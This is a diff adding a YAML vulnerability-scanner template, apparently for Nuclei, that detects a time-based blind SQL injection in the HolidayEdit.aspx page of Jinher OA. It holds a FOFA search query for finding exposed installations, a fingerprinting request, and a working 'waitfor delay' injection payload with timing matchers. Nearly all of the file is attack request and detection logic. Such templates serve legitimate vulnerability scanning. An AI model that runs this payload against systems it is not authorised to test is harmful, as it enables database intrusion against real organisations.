@@ -1,0 +1,43 @@
+id: poc-yaml-jinher-jhsoft-holidayedit-aspx-sqli
+
+info:
+  name: 金和OA HolidayEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.FlowStat/HolidayEdit.aspx/?id=1'waitfor+delay%270:0:{{t1}}%27--&type=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
